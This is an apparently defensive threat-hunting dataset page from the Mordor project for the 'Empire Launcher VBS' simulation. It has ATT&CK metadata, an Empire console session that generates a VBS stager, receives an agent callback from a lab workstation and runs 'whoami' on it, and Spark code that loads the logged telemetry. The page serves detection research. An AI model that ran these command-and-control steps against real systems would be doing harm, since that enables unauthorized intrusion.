# Empire Launcher VBS

## Metadata


|                       |    |
|:----------------------|:---|
| id                    | SDWIN-190518182022 |
| author                | Roberto Rodriguez @Cyb3rWard0g |
| creation date         | 2019/05/18 |
| platform              | Windows |
| Tactic(s)             | ['[TA0002](https://attack.mitre.org/tactics/TA0002)'] |
| Technique(s)          | ['[T1059.005](https://attack.mitre.org/techniques/T1059/005)'] |
| Simulaton Environment | Mordor shire |
| Simulation Scripts    | ['https://github.com/BC-SECURITY/Empire/blob/master/lib/stagers/windows/launcher_vbs.py'] |
| Dataset Host           | ['https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/host/empire_launcher_vbs.zip'] |
| References        | None |

## Dataset Description
This dataset represents adversaries executing a VBS script as a launcher for initial access.

## Adversary View
```
(Empire: listeners) > usestager windows/launcher_vbs
(Empire: stager/windows/launcher_vbs) > info

Name: VBS Launcher

Description:
  Generates a .vbs launcher for Empire.

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True                          Listener to generate stager for.
  Language         True        powershell        Language of the stager to generate.
  StagerRetries    False       0                 Times for the stager to retry
                                                connecting.
  OutFile          False       /tmp/launcher.vbs File to output .vbs launcher to,
                                                otherwise displayed on the screen.
  Obfuscate        False       False             Switch. Obfuscate the launcher
                                                powershell code, uses the
                                                ObfuscateCommand for obfuscation types.
                                                For powershell only.
  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation command to use.
                                                Only used if Obfuscate switch is True.
                                                For powershell only.
  UserAgent        False       default           User-agent string to use for the staging
                                                request (default, none, or other).
  Proxy            False       default           Proxy to use for request (default, none,
                                                or other).
  ProxyCreds       False       default           Proxy credentials
                                                ([domain\]username:password) to use for
                                                request (default, none, or other).


(Empire: stager/windows/launcher_vbs) > set Listener http
(Empire: stager/windows/launcher_vbs) > execute

[*] Stager output written out to: /tmp/launcher.vbs

(Empire: stager/windows/launcher_vbs) > 
[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5
[*] New agent K47LRAEP checked in
[+] Initial agent K47LRAEP from 172.18.39.5 now active (Slack)
[*] Sending agent (stage 2) to K47LRAEP at 172.18.39.5

(Empire: stager/windows/launcher_vbs) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
K47LRAEP ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         2316   5/0.0    2020-09-04 20:10:07  http            

(Empire: agents) > interact K47LRAEP
(Empire: K47LRAEP) > 
(Empire: K47LRAEP) > shell whoami
[*] Tasked K47LRAEP to run TASK_SHELL
[*] Agent K47LRAEP tasked with task ID 1
(Empire: K47LRAEP) > 
theshire\pgustavo
..Command execution completed.

(Empire: K47LRAEP) > 
(Empire: K47LRAEP) > 
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/host/empire_launcher_vbs.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        